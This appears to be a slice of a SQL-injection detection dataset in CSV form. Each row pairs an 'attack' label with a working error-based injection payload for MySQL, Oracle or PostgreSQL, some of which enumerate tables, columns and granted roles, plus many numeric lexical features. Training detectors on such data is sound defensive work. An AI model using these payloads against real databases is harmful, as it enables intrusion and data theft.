id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000100,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000068,0.5570108573939133,185.3801795757728,30.0,3.661089036953394,48.3801795757728,36.520718303091186,75.47928169690881,25.0,0.2609731067097028,0.19697839584190124,0.40718957531513006,0.13485892213326592,4.0,0.0,0.0,0.0,5.551115123125783e-17,1.6198204242272038,0.0,14.0,0.0,0.0,5.380179575772797,1.6198204242272034,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000101,attack,error,"1%'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000271,1.2783281753341487,171.69409141675447,27.485069891018888,3.585146190498831,37.940279564075546,37.059720435924454,70.14930108981113,26.54479032694334,0.22173586896160324,0.21571537869734858,0.4080530724456859,0.15449567989536225,4.0,0.0,0.0,0.0,5.551115123125783e-17,2.0,0.0,13.029860217962225,2.0,0.0,5.514930108981114,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.4850698910188873,0.5149301089811128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000102,attack,error,"1' in boolean mode  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  #",nearest_attack_euclidean,R000168,0.867946201104318,308.17569684694655,38.73525894758848,3.9987773864985052,108.55836631865024,55.0,112.14681263311937,32.47051789517696,0.3520160651033741,0.1786530044653383,0.3639524226316156,0.10537850779967203,1.0,0.0,0.0,0.0,2.0,1.0,0.0,20.73525894758848,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.7352589475884808,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.0
SMOTE_000103,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.0,221.0,42.0,4.3919306235717706,123.0,2.0,71.0,25.0,0.5565610859728507,0.009049773755656104,0.3212669683257919,0.11312217194570136,3.0,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,10.0,0.0,7.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000104,attack,error,"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000197,0.4308435297636275,290.59493563270684,42.4162746798926,4.057154427665537,106.4162746798926,42.221699573190136,107.34611159302904,34.61084978659507,0.36647659290296003,0.14517633811771471,0.36923684532852014,0.11911022365080516,0.0,0.9027124466487668,2.0,0.0,2.0,1.9027124466487668,0.0,19.805424893297534,0.0,2.0,5.0,5.902712446648767,0.0,0.9027124466487668,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.9027124466487666,2.0,0.09728755335123307,0.9027124466487668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.902712446648767
SMOTE_000105,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000106,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",nearest_attack_euclidean,R000295,1.188154937275292,341.61751149302603,38.510682863002366,3.8662558673719154,109.51068286300236,55.0,137.08546290401893,40.02136572600473,0.32062474860392615,0.16104052480344766,0.40119893738144896,0.11713578921117723,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.02136572600473,0.0,0.0,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.5106828630023652,0.48931713699763485,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000107,attack,error,"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000076,0.8428739485417744,372.60553314401847,33.0,3.352146905100269,84.6032276673441,53.59861671399538,172.403688762679,62.0,0.22699823342419434,0.14391469613307833,0.4626631443081389,0.16642392613458845,0.19953890466512747,0.8004610953348725,2.1995389046651277,0.0,5.551115123125783e-17,3.0,0.0,33.800461095334875,0.0,0.0,0.0,25.199538904665125,0.19953890466512753,0.8004610953348725,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.8004610953348725,0.1995389046651275,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000108,attack,error,"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000296,0.6200404876639877,214.66234598301958,34.116872022640564,3.7071593658438937,58.22078199433986,40.0,88.0,28.441563988679718,0.2712182109430551,0.18634536717083458,0.4099598077758361,0.13247661411027414,2.441563988679717,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.22078199433985835,0.7792180056601415,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000109,attack,error,"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",nearest_attack_euclidean,R000110,1.8442801871900294,365.09808276824873,33.53091671013471,3.488154235710657,92.0,47.123666840538846,161.62899947838346,64.34541644932645,0.25206649583161944,0.12920890121985545,0.44254882065544116,0.17617578229308392,0.0,3.9999999999999996,0.0,0.0,5.551115123125783e-17,3.0,0.0,32.93816657973058,0.9381665797305772,1.4072498695958657,0.5309167101347114,23.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000110,attack,error,"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",nearest_attack_euclidean,R000091,0.6210840739578629,292.0708852710546,34.85538744563548,3.8620407995481387,106.40926190199025,35.0,113.81852380398051,36.843099565083826,0.3645875804653487,0.12015928518936997,0.3892960399664796,0.12595709437880168,0.0,3.421549782541911,0.0,0.0,2.0,1.8553874456354778,0.0,21.566162336906434,0.0,2.0,5.0,3.8553874456354773,0.0,0.8553874456354778,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.8553874456354778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.855387445635477
SMOTE_000111,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh",nearest_attack_euclidean,R000285,0.033207680481540984,170.73605882410052,29.952010695291005,3.7872834245933147,50.904021390582,35.0,62.85603208587301,21.976005347645504,0.2981377433391958,0.20501600662121644,0.3681290124548959,0.12871723758469186,4.0,0.0,0.0,0.0,5.551115123125783e-17,1.023994652354498,0.0,11.952010695291005,0.0,0.0,5.0,1.0239946523544985,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000112,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000258,0.7841394856440849,287.12384822143815,36.520641370239694,3.9840104591086765,108.5206413702397,36.38837698730585,105.52064137023969,36.69418849365292,0.3780720844747779,0.12656193891246764,0.36761797040734384,0.1277480062054106,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,4.694188493652922,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.17354712341323056,3.1735471234132304,0.0,0.17354712341323036,2.0,1.6529057531735387,0.17354712341323048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.17354712341323
SMOTE_000113,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",nearest_attack_euclidean,R000240,2.4245548909381958,187.35190025729355,31.0,3.7144173058840506,64.0,24.0,75.45991688107796,23.89198337621559,0.34299654498673904,0.12862370437002713,0.4010147714229644,0.1273649792202695,2.1080166237844087,1.8919833762155913,0.0,0.0,5.551115123125783e-17,2.220446049250313e-16,0.0,15.891983376215592,0.0,0.0,4.0,0.0,0.5270041559461022,0.47299584405389783,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000114,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh",nearest_attack_euclidean,R000285,0.2519968254941421,168.99707966713518,29.635832666751853,3.7876468559661634,50.271665333503705,35.0,61.90749800025555,21.817916333375926,0.29742703614785226,0.20724057791119402,0.36620490274174644,0.1291274831992072,4.0,0.0,0.0,0.0,5.551115123125783e-17,1.1820836666240746,0.0,11.63583266675185,0.0,0.0,5.0,1.1820836666240746,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000115,attack,error,"-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000231,0.93856547772256,360.50570320044505,34.809008430871934,3.548920969044789,86.88768633870117,59.190991569128066,154.1573558156585,60.26966947695731,0.24094117079929206,0.16428830190137042,0.4275668797011313,0.16720364759820622,0.26966947695731136,0.0,2.7303305230426886,0.0,5.551115123125783e-17,3.0,0.0,31.26966947695731,0.0,0.0,1.0,25.73033052304269,0.26966947695731136,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.26966947695731125,0.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000116,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",nearest_attack_euclidean,R000186,0.8264088204163927,171.31724304847478,29.41268972193899,3.8095040224317884,46.65075888775596,39.0,62.42841499490182,23.23806916581697,0.27287438201253406,0.2287994229983799,0.3626035679727871,0.13572262701629892,4.0,0.0,0.0,0.0,5.551115123125783e-17,1.5873102780610098,0.0,11.650758887755963,0.0,0.0,6.0,1.5873102780610093,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000117,attack,error,"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000135,0.025082111916646454,225.92959456651852,39.01173423891358,3.90809475808637,68.0,45.0,88.95306304434567,23.976531522172838,0.30098124636920237,0.1991787659796192,0.39371798736126257,0.10612200028991586,0.9882657610864186,0.0,1.0,0.0,1.0,2.0,0.0,14.988265761086419,0.0,0.0,3.0,4.0,0.988265761086419,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_000118,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,1.6858739404357614e-07,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,0.0,5.551115123125783e-17,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000119,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R000219,1.448764942564574,191.12898002330417,29.589854289043455,3.874914343118765,68.35941715617382,37.0,66.58985428904344,19.17970857808691,0.35759133156917217,0.193649808124421,0.34846987349118064,0.10028898681522622,0.0,0.0,1.1797085780869079,0.0,5.551115123125783e-17,1.0,0.0,12.0,0.0,0.0,5.0,2.179708578086908,0.0,0.0,0.5898542890434538,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000120,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",nearest_attack_euclidean,R000151,0.33763264267587173,335.4204550445674,35.0,3.5472028851585855,85.79900596256917,49.35511376114185,143.08877844028547,57.177556880570926,0.2557410548563719,0.14712579725438474,0.4266597684147323,0.1704733794745111,0.0,0.08877844028546278,2.0,0.0,5.551115123125783e-17,2.088778440285463,0.0,29.911221559714537,0.0,0.26633532085638834,0.9112215597145372,24.088778440285463,0.0,0.08877844028546286,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.08877844028546278,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.088778440285463
SMOTE_000121,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,1.6858739404357614e-07,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,0.0,5.551115123125783e-17,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000122,attack,error,"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000141,0.011258990009830428,218.96331042149131,40.98777014049711,3.7959532813145445,63.0,37.0,92.97554028099422,25.987770140497112,0.287720784690249,0.16897887354824148,0.4246158478002667,0.1186844939612428,0.0,1.0,1.0,0.0,1.0,1.0,0.0,16.993885070248556,0.9938850702485557,0.0,3.0,3.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000123,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000124,attack,error,-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R000066,0.9990739155225395,365.8382053823506,33.0,3.3679079757083916,80.65561980637119,55.290448654412344,167.89213692156707,62.0,0.22039869064835294,0.1512102358871629,0.45888487499767605,0.16950619846680817,0.7634828848041157,0.2365171151958842,2.763482884804116,0.0,5.551115123125783e-17,3.0,0.0,33.23651711519588,0.0,0.0,0.0,25.763482884804112,0.7634828848041159,0.23651711519588411,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.23651711519588403,0.7634828848041159,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
